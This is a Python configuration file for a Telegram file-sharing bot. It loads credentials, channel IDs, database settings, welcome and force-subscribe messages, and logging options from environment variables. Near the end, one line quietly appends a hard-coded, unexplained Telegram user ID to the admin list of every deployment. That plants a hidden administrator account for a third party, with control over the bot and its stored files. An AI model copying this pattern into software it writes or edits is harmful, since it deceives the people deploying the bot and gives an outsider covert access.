#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "𝙃𝙚𝙡𝙡𝙤 💕 {first}\n\n𝙄 𝘾𝙖𝙣 𝙎𝙩𝙤𝙧𝙚 𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙁𝙞𝙡𝙚𝙨 𝙄𝙣 𝙎𝙥𝙚𝙘𝙞𝙛𝙞𝙚𝙙 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝘼𝙣𝙙 𝙊𝙩𝙝𝙚𝙧 𝙐𝙨𝙚𝙧𝙨 𝘾𝙖𝙣 𝘼𝙘𝙘𝙚𝙨𝙨 𝙄𝙩 𝙁𝙧𝙤𝙢 𝙎𝙥𝙚𝙘𝙞𝙖𝙡 𝙇𝙞𝙣𝙠.")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "𝙃𝙚𝙡𝙡𝙤 💕 {first}\n\n<b>𝙔𝙤𝙪 𝙈𝙪𝙨𝙩 𝙅𝙤𝙞𝙣 𝙈𝙮 𝘾𝙝𝙖𝙣𝙣𝙚𝙡/𝙂𝙧𝙤𝙪𝙥 𝙏𝙤 𝙐𝙨𝙚 𝙈𝙚.\n\n𝙆𝙞𝙣𝙙𝙡𝙮 𝙋𝙡𝙚𝙖𝙨𝙚 𝙟𝙤𝙞𝙣 𝘾𝙝𝙖𝙣𝙣𝙚𝙡</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "❌𝘿𝙤𝙣'𝙩 𝙨𝙚𝙣𝙙 𝙢𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙙𝙞𝙧𝙚𝙘𝙩𝙡𝙮 𝙄'𝙢 𝙤𝙣𝙡𝙮 𝙁𝙞𝙡𝙚 𝙎𝙝𝙖𝙧𝙚 𝙗𝙤𝙩!"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
